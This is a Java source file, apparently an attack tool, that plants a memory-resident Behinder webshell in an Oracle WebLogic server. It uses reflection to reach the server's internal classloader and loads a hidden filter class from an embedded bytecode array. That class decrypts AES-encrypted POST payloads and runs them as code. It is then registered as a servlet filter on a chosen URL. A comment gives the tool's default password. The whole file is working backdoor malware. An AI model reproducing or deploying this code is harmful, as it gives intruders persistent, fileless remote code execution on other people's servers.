import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.Map;

public class WeblogicBehinderFilterShell {
    public static String urlPatern = "";
    // password: rebeyond
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public boolean equals(Object object) {
        PageContext page = (PageContext)object;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        this.Response.setCharacterEncoding("UTF-8");
        StringBuilder results = new StringBuilder();

        try {
            if (!urlPatern.equals("")) {
                Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
                Method m = executeThread.getDeclaredMethod("getCurrentWork");
                Object currentWork = m.invoke(Thread.currentThread());

                Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
                connectionHandlerF.setAccessible(true);
                Object obj = connectionHandlerF.get(currentWork);

                Field requestF = obj.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                obj = requestF.get(obj);

                Field contextF = obj.getClass().getDeclaredField("context");
                contextF.setAccessible(true);
                Object context = contextF.get(obj);

                Field classLoaderF = context.getClass().getDeclaredField("classLoader");
                classLoaderF.setAccessible(true);
                ClassLoader cl = (ClassLoader) classLoaderF.get(context);

                Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
                cachedClassesF.setAccessible(true);
                Object cachedClass = cachedClassesF.get(cl);

                Method getM = cachedClass.getClass().getDeclaredMethod("get", Object.class);
                String classN = "FilterClass" + System.currentTimeMillis();
                String filterN = "FilterName" + System.currentTimeMillis();
                if (getM.invoke(cachedClass, classN) == null) {
                    byte[] bytes = new byte[] {-54, -2, -70, -66, 0, 0, 0, 50, 0, -50, 10, 0, 39, 0, 112, 10, 0, 39, 0, 113, 10, 0, 39, 0, 114, 9, 0, 21, 0, 115, 7, 0, 116, 11, 0, 5, 0, 117, 8, 0, 118, 10, 0, 119, 0, 120, 8, 0, 121, 11, 0, 5, 0, 122, 8, 0, 123, 11, 0, 124, 0, 125, 8, 0, 126, 10, 0, 127, 0, -128, 7, 0, -127, 10, 0, 119, 0, -126, 10, 0, 15, 0, -125, 10, 0, 127, 0, -124, 10, 0, -123, 0, -122, 10, 0, -123, 0, -121, 7, 0, -120, 10, 0, -119, 0, -118, 10, 0, -117, 0, -116, 10, 0, 21, 0, 113, 7, 0, -115, 10, 0, 25, 0, 112, 11, 0, -114, 0, -113, 10, 0, -112, 0, -111, 10, 0, 25, 0, -110, 10, 0, 127, 0, -109, 10, 0, 21, 0, -108, 10, 0, -117, 0, -107, 10, 0, -119, 0, 120, 7, 0, -106, 11, 0, -105, 0, -104, 10, 0, 21, 0, -103, 8, 0, -102, 11, 0, -101, 0, -100, 7, 0, -99, 7, 0, -98, 7, 0, -97, 7, 0, -96, 1, 0, 12, 102, 105, 108, 116, 101, 114, 67, 111, 110, 102, 105, 103, 1, 0, 28, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 70, 105, 108, 116, 101, 114, 67, 111, 110, 102, 105, 103, 59, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 21, 76, 87, 101, 98, 108, 111, 103, 105, 99, 70, 105, 108, 116, 101, 114, 83, 104, 101, 108, 108, 59, 1, 0, 26, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 59, 41, 86, 1, 0, 1, 99, 1, 0, 23, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 59, 1, 0, 1, 103, 1, 0, 21, 40, 91, 66, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 1, 0, 1, 98, 1, 0, 2, 91, 66, 1, 0, 4, 105, 110, 105, 116, 1, 0, 31, 40, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 70, 105, 108, 116, 101, 114, 67, 111, 110, 102, 105, 103, 59, 41, 86, 1, 0, 6, 67, 111, 110, 102, 105, 103, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, -95, 1, 0, 8, 100, 111, 70, 105, 108, 116, 101, 114, 1, 0, 91, 40, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 82, 101, 113, 117, 101, 115, 116, 59, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 82, 101, 115, 112, 111, 110, 115, 101, 59, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 70, 105, 108, 116, 101, 114, 67, 104, 97, 105, 110, 59, 41, 86, 1, 0, 21, 76, 106, 97, 118, 97, 120, 47, 99, 114, 121, 112, 116, 111, 47, 67, 105, 112, 104, 101, 114, 59, 1, 0, 11, 112, 97, 103, 101, 67, 111, 110, 116, 101, 120, 116, 1, 0, 31, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 106, 115, 112, 47, 80, 97, 103, 101, 67, 111, 110, 116, 101, 120, 116, 59, 1, 0, 1, 107, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 7, 114, 101, 113, 117, 101, 115, 116, 1, 0, 30, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 82, 101, 113, 117, 101, 115, 116, 59, 1, 0, 8, 114, 101, 115, 112, 111, 110, 115, 101, 1, 0, 31, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 82, 101, 115, 112, 111, 110, 115, 101, 59, 1, 0, 11, 102, 105, 108, 116, 101, 114, 67, 104, 97, 105, 110, 1, 0, 27, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 70, 105, 108, 116, 101, 114, 67, 104, 97, 105, 110, 59, 1, 0, 3, 114, 101, 113, 1, 0, 39, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 104, 116, 116, 112, 47, 72, 116, 116, 112, 83, 101, 114, 118, 108, 101, 116, 82, 101, 113, 117, 101, 115, 116, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, -120, 7, 0, -94, 7, 0, -93, 7, 0, -92, 7, 0, 116, 7, 0, -91, 7, 0, -106, 7, 0, -90, 1, 0, 32, 40, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 67, 111, 110, 102, 105, 103, 59, 41, 86, 1, 0, 13, 115, 101, 114, 118, 108, 101, 116, 67, 111, 110, 102, 105, 103, 1, 0, 29, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 67, 111, 110, 102, 105, 103, 59, 1, 0, 16, 103, 101, 116, 83, 101, 114, 118, 108, 101, 116, 67, 111, 110, 102, 105, 103, 1, 0, 31, 40, 41, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 67, 111, 110, 102, 105, 103, 59, 1, 0, 7, 115, 101, 114, 118, 105, 99, 101, 1, 0, 64, 40, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 82, 101, 113, 117, 101, 115, 116, 59, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 82, 101, 115, 112, 111, 110, 115, 101, 59, 41, 86, 1, 0, 14, 115, 101, 114, 118, 108, 101, 116, 82, 101, 113, 117, 101, 115, 116, 1, 0, 15, 115, 101, 114, 118, 108, 101, 116, 82, 101, 115, 112, 111, 110, 115, 101, 1, 0, 14, 103, 101, 116, 83, 101, 114, 118, 108, 101, 116, 73, 110, 102, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 7, 100, 101, 115, 116, 114, 111, 121, 1, 0, 14, 103, 101, 116, 83, 101, 114, 118, 108, 101, 116, 78, 97, 109, 101, 1, 0, 17, 103, 101, 116, 83, 101, 114, 118, 108, 101, 116, 67, 111, 110, 116, 101, 120, 116, 1, 0, 32, 40, 41, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 67, 111, 110, 116, 101, 120, 116, 59, 1, 0, 16, 103, 101, 116, 73, 110, 105, 116, 80, 97, 114, 97, 109, 101, 116, 101, 114, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 1, 115, 1, 0, 21, 103, 101, 116, 73, 110, 105, 116, 80, 97, 114, 97, 109, 101, 116, 101, 114, 78, 97, 109, 101, 115, 1, 0, 25, 40, 41, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 69, 110, 117, 109, 101, 114, 97, 116, 105, 111, 110, 59, 1, 0, 9, 83, 105, 103, 110, 97, 116, 117, 114, 101, 1, 0, 45, 40, 41, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 69, 110, 117, 109, 101, 114, 97, 116, 105, 111, 110, 60, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 62, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 24, 87, 101, 98, 108, 111, 103, 105, 99, 70, 105, 108, 116, 101, 114, 83, 104, 101, 108, 108, 46, 106, 97, 118, 97, 12, 0, 45, 0, 46, 12, 0, 45, 0, 52, 12, 0, -89, 0, -88, 12, 0, 43, 0, 44, 1, 0, 37, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 104, 116, 116, 112, 47, 72, 116, 116, 112, 83, 101, 114, 118, 108, 101, 116, 82, 101, 113, 117, 101, 115, 116, 12, 0, -87, 0, 98, 1, 0, 4, 80, 79, 83, 84, 7, 0, -91, 12, 0, -86, 0, -85, 1, 0, 16, 101, 52, 53, 101, 51, 50, 57, 102, 101, 98, 53, 100, 57, 50, 53, 98, 12, 0, -84, 0, -83, 1, 0, 1, 117, 7, 0, -82, 12, 0, -81, 0, -80, 1, 0, 3, 65, 69, 83, 7, 0, -79, 12, 0, -78, 0, -77, 1, 0, 31, 106, 97, 118, 97, 120, 47, 99, 114, 121, 112, 116, 111, 47, 115, 112, 101, 99, 47, 83, 101, 99, 114, 101, 116, 75, 101, 121, 83, 112, 101, 99, 12, 0, -76, 0, -75, 12, 0, 45, 0, -74, 12, 0, 59, 0, -73, 7, 0, -72, 12, 0, -71, 0, -70, 12, 0, -69, 0, -68, 1, 0, 19, 87, 101, 98, 108, 111, 103, 105, 99, 70, 105, 108, 116, 101, 114, 83, 104, 101, 108, 108, 7, 0, -67, 12, 0, -66, 0, -65, 7, 0, -64, 12, 0, -63, 0, -62, 1, 0, 22, 115, 117, 110, 47, 109, 105, 115, 99, 47, 66, 65, 83, 69, 54, 52, 68, 101, 99, 111, 100, 101, 114, 7, 0, -94, 12, 0, -61, 0, -60, 7, 0, -59, 12, 0, -58, 0, 98, 12, 0, -57, 0, -56, 12, 0, -55, 0, -54, 12, 0, 55, 0, 56, 12, 0, -53, 0, -52, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 7, 0, -92, 12, 0, 64, 0, 94, 12, 0, 100, 0, 98, 1, 0, 7, 83, 101, 114, 118, 108, 101, 116, 7, 0, -51, 12, 0, 101, 0, 102, 1, 0, 21, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 1, 0, 20, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 70, 105, 108, 116, 101, 114, 1, 0, 21, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 1, 0, 27, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 67, 111, 110, 102, 105, 103, 1, 0, 30, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 28, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 82, 101, 113, 117, 101, 115, 116, 1, 0, 29, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 82, 101, 115, 112, 111, 110, 115, 101, 1, 0, 25, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 70, 105, 108, 116, 101, 114, 67, 104, 97, 105, 110, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 11, 100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115, 1, 0, 23, 40, 91, 66, 73, 73, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 1, 0, 9, 103, 101, 116, 77, 101, 116, 104, 111, 100, 1, 0, 6, 101, 113, 117, 97, 108, 115, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 90, 1, 0, 10, 103, 101, 116, 83, 101, 115, 115, 105, 111, 110, 1, 0, 34, 40, 41, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 104, 116, 116, 112, 47, 72, 116, 116, 112, 83, 101, 115, 115, 105, 111, 110, 59, 1, 0, 30, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 104, 116, 116, 112, 47, 72, 116, 116, 112, 83, 101, 115, 115, 105, 111, 110, 1, 0, 8, 112, 117, 116, 86, 97, 108, 117, 101, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 86, 1, 0, 19, 106, 97, 118, 97, 120, 47, 99, 114, 121, 112, 116, 111, 47, 67, 105, 112, 104, 101, 114, 1, 0, 11, 103, 101, 116, 73, 110, 115, 116, 97, 110, 99, 101, 1, 0, 41, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 120, 47, 99, 114, 121, 112, 116, 111, 47, 67, 105, 112, 104, 101, 114, 59, 1, 0, 8, 103, 101, 116, 66, 121, 116, 101, 115, 1, 0, 4, 40, 41, 91, 66, 1, 0, 23, 40, 91, 66, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 23, 40, 73, 76, 106, 97, 118, 97, 47, 115, 101, 99, 117, 114, 105, 116, 121, 47, 75, 101, 121, 59, 41, 86, 1, 0, 28, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 106, 115, 112, 47, 74, 115, 112, 70, 97, 99, 116, 111, 114, 121, 1, 0, 17, 103, 101, 116, 68, 101, 102, 97, 117, 108, 116, 70, 97, 99, 116, 111, 114, 121, 1, 0, 32, 40, 41, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 106, 115, 112, 47, 74, 115, 112, 70, 97, 99, 116, 111, 114, 121, 59, 1, 0, 14, 103, 101, 116, 80, 97, 103, 101, 67, 111, 110, 116, 101, 120, 116, 1, 0, -118, 40, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 59, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 82, 101, 113, 117, 101, 115, 116, 59, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 83, 101, 114, 118, 108, 101, 116, 82, 101, 115, 112, 111, 110, 115, 101, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 90, 73, 90, 41, 76, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 106, 115, 112, 47, 80, 97, 103, 101, 67, 111, 110, 116, 101, 120, 116, 59, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 8, 103, 101, 116, 67, 108, 97, 115, 115, 1, 0, 19, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 1, 0, 15, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 1, 0, 14, 103, 101, 116, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 1, 0, 25, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 59, 1, 0, 9, 103, 101, 116, 82, 101, 97, 100, 101, 114, 1, 0, 26, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 59, 1, 0, 22, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 1, 0, 8, 114, 101, 97, 100, 76, 105, 110, 101, 1, 0, 12, 100, 101, 99, 111, 100, 101, 66, 117, 102, 102, 101, 114, 1, 0, 22, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 91, 66, 1, 0, 7, 100, 111, 70, 105, 110, 97, 108, 1, 0, 6, 40, 91, 66, 41, 91, 66, 1, 0, 11, 110, 101, 119, 73, 110, 115, 116, 97, 110, 99, 101, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 1, 0, 26, 106, 97, 118, 97, 120, 47, 115, 101, 114, 118, 108, 101, 116, 47, 70, 105, 108, 116, 101, 114, 67, 111, 110, 102, 105, 103, 0, 33, 0, 21, 0, 39, 0, 3, 0, 40, 0, 41, 0, 42, 0, 1, 0, 2, 0, 43, 0, 44, 0, 0, 0, 14, 0, 1, 0, 45, 0, 46, 0, 1, 0, 47, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 48, 0, 0, 0, 6, 0, 1, 0, 0, 0, 12, 0, 49, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 50, 0, 51, 0, 0, 0, 1, 0, 45, 0, 52, 0, 1, 0, 47, 0, 0, 0, 62, 0, 2, 0, 2, 0, 0, 0, 6, 42, 43, -73, 0, 2, -79, 0, 0, 0, 2, 0, 48, 0, 0, 0, 10, 0, 2, 0, 0, 0, 14, 0, 5, 0, 15, 0, 49, 0, 0, 0, 22, 0, 2, 0, 0, 0, 6, 0, 50, 0, 51, 0, 0, 0, 0, 0, 6, 0, 53, 0, 54, 0, 1, 0, 1, 0, 55, 0, 56, 0, 1, 0, 47, 0, 0, 0, 61, 0, 4, 0, 2, 0, 0, 0, 9, 42, 43, 3, 43, -66, -73, 0, 3, -80, 0, 0, 0, 2, 0, 48, 0, 0, 0, 6, 0, 1, 0, 0, 0, 18, 0, 49, 0, 0, 0, 22, 0, 2, 0, 0, 0, 9, 0, 50, 0, 51, 0, 0, 0, 0, 0, 9, 0, 57, 0, 58, 0, 1, 0, 1, 0, 59, 0, 60, 0, 2, 0, 47, 0, 0, 0, 62, 0, 2, 0, 2, 0, 0, 0, 6, 42, 43, -75, 0, 4, -79, 0, 0, 0, 2, 0, 48, 0, 0, 0, 10, 0, 2, 0, 0, 0, 21, 0, 5, 0, 22, 0, 49, 0, 0, 0, 22, 0, 2, 0, 0, 0, 6, 0, 50, 0, 51, 0, 0, 0, 0, 0, 6, 0, 61, 0, 44, 0, 1, 0, 62, 0, 0, 0, 4, 0, 1, 0, 63, 0, 1, 0, 64, 0, 65, 0, 2, 0, 47, 0, 0, 1, 96, 0, 8, 0, 8, 0, 0, 0, -107, 43, -64, 0, 5, 58, 4, 25, 4, -71, 0, 6, 1, 0, 18, 7, -74, 0, 8, -103, 0, 122, 18, 9, 58, 5, 25, 4, -71, 0, 10, 1, 0, 18, 11, 25, 5, -71, 0, 12, 3, 0, 18, 13, -72, 0, 14, 58, 6, 25, 6, 5, -69, 0, 15, 89, 25, 5, -74, 0, 16, 18, 13, -73, 0, 17, -74, 0, 18, -72, 0, 19, 42, 43, 44, 1, 4, 17, 32, 0, 4, -74, 0, 20, 58, 7, -69, 0, 21, 89, 42, -74, 0, 22, -74, 0, 23, -73, 0, 24, 25, 6, -69, 0, 25, 89, -73, 0, 26, 43, -71, 0, 27, 1, 0, -74, 0, 28, -74, 0, 29, -74, 0, 30, -74, 0, 31, -74, 0, 32, 25, 7, -74, 0, 33, 87, -89, 0, 5, 58, 6, 45, 43, 44, -71, 0, 35, 3, 0, -79, 0, 1, 0, 41, 0, -121, 0, -118, 0, 34, 0, 3, 0, 48, 0, 0, 0, 50, 0, 12, 0, 0, 0, 24, 0, 6, 0, 25, 0, 21, 0, 26, 0, 25, 0, 27, 0, 41, 0, 29, 0, 48, 0, 30, 0, 68, 0, 31, 0, 85, 0, 32, 0, -121, 0, 35, 0, -118, 0, 33, 0, -116, 0, 37, 0, -108, 0, 38, 0, 49, 0, 0, 0, 82, 0, 8, 0, 48, 0, 87, 0, 53, 0, 66, 0, 6, 0, 85, 0, 50, 0, 67, 0, 68, 0, 7, 0, 25, 0, 115, 0, 69, 0, 70, 0, 5, 0, 0, 0, -107, 0, 50, 0, 51, 0, 0, 0, 0, 0, -107, 0, 71, 0, 72, 0, 1, 0, 0, 0, -107, 0, 73, 0, 74, 0, 2, 0, 0, 0, -107, 0, 75, 0, 76, 0, 3, 0, 6, 0, -113, 0, 77, 0, 78, 0, 4, 0, 79, 0, 0, 0, 33, 0, 2, -1, 0, -118, 0, 6, 7, 0, 80, 7, 0, 81, 7, 0, 82, 7, 0, 83, 7, 0, 84, 7, 0, 85, 0, 1, 7, 0, 86, -6, 0, 1, 0, 62, 0, 0, 0, 6, 0, 2, 0, 87, 0, 63, 0, 1, 0, 59, 0, 88, 0, 2, 0, 47, 0, 0, 0, 53, 0, 0, 0, 2, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 48, 0, 0, 0, 6, 0, 1, 0, 0, 0, 41, 0, 49, 0, 0, 0, 22, 0, 2, 0, 0, 0, 1, 0, 50, 0, 51, 0, 0, 0, 0, 0, 1, 0, 89, 0, 90, 0, 1, 0, 62, 0, 0, 0, 4, 0, 1, 0, 63, 0, 1, 0, 91, 0, 92, 0, 1, 0, 47, 0, 0, 0, 44, 0, 1, 0, 1, 0, 0, 0, 2, 42, -80, 0, 0, 0, 2, 0, 48, 0, 0, 0, 6, 0, 1, 0, 0, 0, 44, 0, 49, 0, 0, 0, 12, 0, 1, 0, 0, 0, 2, 0, 50, 0, 51, 0, 0, 0, 1, 0, 93, 0, 94, 0, 2, 0, 47, 0, 0, 0, 63, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 48, 0, 0, 0, 6, 0, 1, 0, 0, 0, 48, 0, 49, 0, 0, 0, 32, 0, 3, 0, 0, 0, 1, 0, 50, 0, 51, 0, 0, 0, 0, 0, 1, 0, 95, 0, 72, 0, 1, 0, 0, 0, 1, 0, 96, 0, 74, 0, 2, 0, 62, 0, 0, 0, 6, 0, 2, 0, 63, 0, 87, 0, 1, 0, 97, 0, 98, 0, 1, 0, 47, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -74, 0, 36, -80, 0, 0, 0, 2, 0, 48, 0, 0, 0, 6, 0, 1, 0, 0, 0, 51, 0, 49, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 50, 0, 51, 0, 0, 0, 1, 0, 99, 0, 46, 0, 1, 0, 47, 0, 0, 0, 43, 0, 0, 0, 1, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 48, 0, 0, 0, 6, 0, 1, 0, 0, 0, 55, 0, 49, 0, 0, 0, 12, 0, 1, 0, 0, 0, 1, 0, 50, 0, 51, 0, 0, 0, 1, 0, 100, 0, 98, 0, 1, 0, 47, 0, 0, 0, 45, 0, 1, 0, 1, 0, 0, 0, 3, 18, 37, -80, 0, 0, 0, 2, 0, 48, 0, 0, 0, 6, 0, 1, 0, 0, 0, 59, 0, 49, 0, 0, 0, 12, 0, 1, 0, 0, 0, 3, 0, 50, 0, 51, 0, 0, 0, 1, 0, 101, 0, 102, 0, 1, 0, 47, 0, 0, 0, 52, 0, 1, 0, 1, 0, 0, 0, 10, 42, -76, 0, 4, -71, 0, 38, 1, 0, -80, 0, 0, 0, 2, 0, 48, 0, 0, 0, 6, 0, 1, 0, 0, 0, 64, 0, 49, 0, 0, 0, 12, 0, 1, 0, 0, 0, 10, 0, 50, 0, 51, 0, 0, 0, 1, 0, 103, 0, 104, 0, 1, 0, 47, 0, 0, 0, 54, 0, 1, 0, 2, 0, 0, 0, 2, 43, -80, 0, 0, 0, 2, 0, 48, 0, 0, 0, 6, 0, 1, 0, 0, 0, 69, 0, 49, 0, 0, 0, 22, 0, 2, 0, 0, 0, 2, 0, 50, 0, 51, 0, 0, 0, 0, 0, 2, 0, 105, 0, 70, 0, 1, 0, 1, 0, 106, 0, 107, 0, 2, 0, 47, 0, 0, 0, 44, 0, 1, 0, 1, 0, 0, 0, 2, 1, -80, 0, 0, 0, 2, 0, 48, 0, 0, 0, 6, 0, 1, 0, 0, 0, 74, 0, 49, 0, 0, 0, 12, 0, 1, 0, 0, 0, 2, 0, 50, 0, 51, 0, 0, 0, 108, 0, 0, 0, 2, 0, 109, 0, 1, 0, 110, 0, 0, 0, 2, 0, 111};
                    Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineClass.setAccessible(true);
                    Class evilFilterClass = (Class) defineClass.invoke(cl, bytes, 0, bytes.length);

                    Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
                    putM.invoke(cachedClass, classN, evilFilterClass);
                }
                Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
                Object filterManager = getFilterManagerM.invoke(context);

                Method registerFilterM = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                registerFilterM.setAccessible(true);
                registerFilterM.invoke(filterManager, filterN, classN, new String[]{urlPatern}, null, null, null);
            } else {
                results.append("urlPatern is null");
            }
        } catch (Exception var6) {
            results.append(var6.toString());
        }

        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(results.toString().getBytes(StandardCharsets.UTF_8));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception var5) {
            var5.printStackTrace();
        }
        return true;
    }
}